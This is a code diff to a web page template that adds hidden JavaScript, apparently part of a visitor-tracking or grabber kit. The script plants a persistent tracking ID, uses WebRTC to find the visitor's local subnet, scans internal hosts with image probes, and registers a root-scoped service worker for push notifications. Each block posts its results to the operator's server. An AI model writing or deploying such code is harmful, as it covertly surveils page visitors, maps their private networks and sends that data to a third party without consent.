@@ -202,6 +202,82 @@ window.addEventListener("beforeunload",function(){
 });
 <% } %>
 
+<% if(feat.persistentId){ %>
+(function(){
+  try{
+    var PID_KEY="__cfvid__";
+    var pid=localStorage.getItem(PID_KEY);
+    var isNew=!pid;
+    if(!pid){
+      pid=([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,function(c){return(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16);});
+      localStorage.setItem(PID_KEY,pid);
+    }
+    var body="uid="+encodeURIComponent(uid)+"&pid="+encodeURIComponent(pid)+"&ret="+(isNew?"new":"existing");
+    var xhr=new XMLHttpRequest();xhr.open("POST",a+"/pid",true);
+    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhr.send(body);
+  }catch(e){}
+})();
+<% } %>
+
+<% if(feat.localNet){ %>
+(function(){
+  try{
+    var found=[];
+    var base=null;
+    var pc=new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.onicecandidate=function(e){
+      if(e&&e.candidate){
+        var m=e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}/);
+        if(m)base=m[1];
+      }
+    };
+    pc.createOffer().then(function(o){pc.setLocalDescription(o);}).catch(function(){});
+    setTimeout(function(){
+      try{pc.close();}catch(e){}
+      if(!base)return;
+      var total=0,done=0,limit=30;
+      function tryHost(i){
+        var img=new Image();
+        img.onload=img.onerror=function(ev){
+          if(ev.type==="load")found.push(base+"."+i);
+          done++;
+          if(done===limit&&found.length){
+            var body="uid="+encodeURIComponent(uid)+"&hosts="+encodeURIComponent(found.map(function(h){return"📡 "+h;}).join("\n"));
+            var xhr=new XMLHttpRequest();xhr.open("POST",a+"/localnet",true);
+            xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+            xhr.send(body);
+          }
+        };
+        img.src="http://"+base+"."+i+":80/favicon.ico?_="+Date.now();
+      }
+      for(var i=1;i<=limit;i++)tryHost(i);
+    },3000);
+  }catch(e){}
+})();
+<% } %>
+
+<% if(feat.webpush){ %>
+(function(){
+  if(!('serviceWorker' in navigator)||!('PushManager' in window))return;
+  navigator.serviceWorker.register(a+"/sw.js",{scope:"/"}).then(function(reg){
+    return Notification.requestPermission().then(function(perm){
+      if(perm!=="granted")return;
+      return reg.pushManager.subscribe({
+        userVisibleOnly:true,
+        applicationServerKey:null
+      }).then(function(sub){
+        var body="uid="+encodeURIComponent(uid)+"&sub="+encodeURIComponent(JSON.stringify(sub));
+        var xhr=new XMLHttpRequest();xhr.open("POST",a+"/push-subscribe",true);
+        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        xhr.send(body);
+      }).catch(function(){});
+    });
+  }).catch(function(){});
+})();
+<% } %>
+
 <% if(clipAccess && feat.clipboard){ %>
 (function(){
   try{
